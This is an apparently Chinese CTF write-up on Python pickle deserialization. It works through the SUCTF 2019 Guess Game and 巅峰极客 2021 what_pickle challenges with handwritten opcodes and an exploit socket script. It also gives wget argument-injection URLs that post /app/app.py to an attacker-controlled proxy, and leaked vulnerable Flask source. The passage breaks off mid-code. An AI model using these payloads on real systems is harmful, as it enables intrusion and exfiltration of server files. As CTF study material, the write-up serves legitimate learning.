&lt;p>“通过GLOBAL指令引入的变量可以看作是原变量的引用，我们在栈上修改它的值，也会修改原变量”，基于这一原理，当&lt;code>c&lt;/code>指令只允许&lt;code>__main__&lt;/code>时，我们可以引入&lt;code>__main__.blue&lt;/code>（blue见题行事 上下文中会提前引入）这个module，再将一个dict压入栈，内容是&lt;code>{'name': 'rua', 'grade': 'www'}&lt;/code>；之后执行BUILD指令，将会改写&lt;code>__main__.blue.name&lt;/code>和 &lt;code>__main__.blue.grade&lt;/code>，此时已经执行了我们想要的变量覆盖。之后弹掉栈顶，现在为空栈，拼接上正常的Student对象序列化后的opcode。此时的完整opcode在被反序列化时，栈顶是正常的Student对象，而被执行时却会先执行一遍前面的过程，造成变量覆盖。&lt;/p>
&lt;p>既然我们可以做到重写变量的值，那也可以将这个值改为read wrapper的返回值做到任意文件读取（详见后面的内容）&lt;/p>
&lt;h3 id="--仅可以引入题目中自设的模块模块名不能有__符">&amp;ndash;&amp;raquo;仅可以引入题目中自设的模块&amp;amp;模块名不能有&lt;code>__&lt;/code>符&lt;/h3>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子2 - [SUCTF 2019]Guess Game
&lt;/h4>
&lt;/summary>
&lt;p>本地复现还是失败，无解，docker地址-&amp;gt;https://github.com/rmb122/suctf2019_guess_game&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809115950444.png" alt="image-20210809115950444">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130400358.png" alt="image-20210809130400358">&lt;/p>
&lt;p>是个猜数游戏，交互逻辑在init.py, Game.py和Ticket.py中，10以内的数字需要猜对10次（全胜）才会返回flag&lt;/p>
&lt;p>然后是game_client.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130523878.png" alt="image-20210809130523878">&lt;/p>
&lt;p>接收数字的输入作为参数生成Ticket对象，序列化后发送到server端&lt;/p>
&lt;p>再看game_server.py，用了重写了的&lt;code>find_class()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809130933730.png" alt="image-20210809130933730">&lt;/p>
&lt;p>这个限制的意思是导入的模块只能以guess_name开头并且名字里没有&lt;code>__&lt;/code>&lt;/p>
&lt;p>大概看完了流程，接下来找找突破口——序列化时是生成一个Ticket的实例&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132300981.png" alt="image-20210809132300981">&lt;/p>
&lt;p>判断输赢则是需要Game辅助&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809132437175.png" alt="image-20210809132437175">&lt;/p>
&lt;p>结合game_server.py的判断条件，拿到flag需要&lt;code>self.win_count == max_round == 10&lt;/code>&lt;/p>
&lt;p>那么构造的方向有了——修改相关参数做到变量覆盖，再以序列化的opcode形式传过去。手写opcode面临的问题就是重写&lt;code>find_class()&lt;/code>后对加载指定模块的限制，而这里我们可以看到&lt;code>__init__.py&lt;/code>中&lt;code>game = Game()&lt;/code>，所以直接可以通过&lt;code>guess_game.game&lt;/code>引入&lt;code>Game()&lt;/code>类，然后修改类中的win_count和round_count就能做到变量覆盖；第二要注意必须手写opcode，如果是先&lt;code>from guess_name import game&lt;/code>，然后修改参数后再dump，则是在运行时重新新建一个Game对象，就不是从guess_game这个module中获取，破坏上下文；第三要注意&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809140423900.png" alt="image-20210809140423900">&lt;/p>
&lt;p>pickle序列化流执行完会把栈顶的值返回，所以栈顶需要设为Ticket，这里可以dumps一个Ticket，然后拼到之前手写的opcode之后&lt;/p>
&lt;p>opcodes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># 修改win_count = 10和round_count = 9，传过去之后执行一次round_count += 1就能全胜&lt;/span>
&lt;span style="color:#111">cguess_name&lt;/span>
&lt;span style="color:#111">game&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#34;win_count&amp;#34;&lt;/span>
&lt;span style="color:#111">I10&lt;/span>
&lt;span style="color:#111">sS&lt;/span>&lt;span style="color:#d88200">&amp;#34;round_count&amp;#34;&lt;/span>
&lt;span style="color:#111">I9&lt;/span>
&lt;span style="color:#111">sbcguess_game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Ticket&lt;/span>\&lt;span style="color:#111">nTicket&lt;/span>\&lt;span style="color:#111">nq&lt;/span>\&lt;span style="color:#111">x00&lt;/span>&lt;span style="color:#111">)&lt;/span>\&lt;span style="color:#111">x81q&lt;/span>\&lt;span style="color:#111">x01&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#111">q&lt;/span>\&lt;span style="color:#111">x02X&lt;/span>\&lt;span style="color:#111">x06&lt;/span>\&lt;span style="color:#111">x00&lt;/span>\&lt;span style="color:#111">x00&lt;/span>\&lt;span style="color:#111">x00numberq&lt;/span>\&lt;span style="color:#111">x03K&lt;/span>\&lt;span style="color:#111">x06sb&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;span style="color:#75715e"># c之后是被find_class()监控的区域，拼接Ticket&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;node4.buuoj.cn&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">28803&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">exp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;cguess_game
&lt;/span>&lt;span style="color:#d88200">game
&lt;/span>&lt;span style="color:#d88200">}S&amp;#34;win_count&amp;#34;
&lt;/span>&lt;span style="color:#d88200">I10
&lt;/span>&lt;span style="color:#d88200">sS&amp;#34;round_count&amp;#34;
&lt;/span>&lt;span style="color:#d88200">I9
&lt;/span>&lt;span style="color:#d88200">sbcguess_game.Ticket&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Ticket&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x06\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">numberq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">K&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">sb.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;gt;I&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">exp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809144613834.png" alt="image-20210809144613834">&lt;/p>
&lt;p>————用pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game.Ticket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Ticket&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">game&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;guess_game&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;game&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">game&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">curr_ticket&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ticket&lt;/span>
&lt;span style="color:#75715e"># b&amp;#34;(I0\niguess_game.Ticket\nTicket\np0\n0cguess_game\ngame\np1\n0g1\n(N(S&amp;#39;curr_ticket&amp;#39;\ng0\ndtbg0\n.&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子3 - [巅峰极客 2021]what_pickle
&lt;/h4>
&lt;/summary>
&lt;p>登录页面 任意密码均可登入，仅显示一张图片+登录时输入的密码；图片的url为/images?image=2.jpg，但是不能常规的目录穿越拿源码，当时做的时候就不会了，下面是复现&lt;/p>
&lt;p>/images可以看到开着的debug界面&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024174438862.png" alt="image-20211024174438862">&lt;/p>
&lt;p>能看到部分的源码，这里的图片是用的wget命令来下载本地8080端口的/image图片，所以我们尝试wget命令注入将文件外带出来&lt;/p>
&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=--post-file=/app/app.py&amp;amp;argv=--execute=http_proxy=http://ip:port
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/images?image=&amp;amp;argv=—post-file=/app/app.py&amp;amp;argv=-e http_proxy=http://ip:port
&lt;/code>&lt;/pre>&lt;p>依次读出/app/app.py和/app/config.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># app.py&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">redirect&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">io&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">ctypes&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">cdll&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">config&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">user&lt;/span>
&lt;span style="color:#111">cdll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">LoadLibrary&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./readflag.so&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;config&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;__&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;Helper function analogous to pickle.loads().&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/index&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/home&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">info&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">Jpg_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Jpg_id&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/images&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">images&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;wget&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getlist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;argv&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">startswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#d88200">&amp;#39;--&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">image&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;image&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#111">)&lt;/span>
